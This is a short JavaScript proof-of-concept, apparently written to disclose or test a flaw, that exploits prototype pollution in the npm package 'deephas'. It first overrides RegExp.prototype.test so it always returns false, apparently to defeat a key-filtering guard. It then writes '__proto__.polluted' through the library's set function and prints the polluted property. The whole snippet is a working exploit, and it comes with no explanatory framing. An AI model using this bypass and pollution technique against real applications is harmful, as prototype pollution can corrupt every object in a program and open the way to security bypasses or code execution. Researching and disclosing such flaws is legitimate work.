RegExp.prototype.test = () => false;
console.log({}.polluted);
const dh = require('deephas');
let obj = {};
dh.set(obj, '__proto__.polluted', 'yes');
console.log('{ ' + obj.polluted + ', ' + 'yes' + ' }');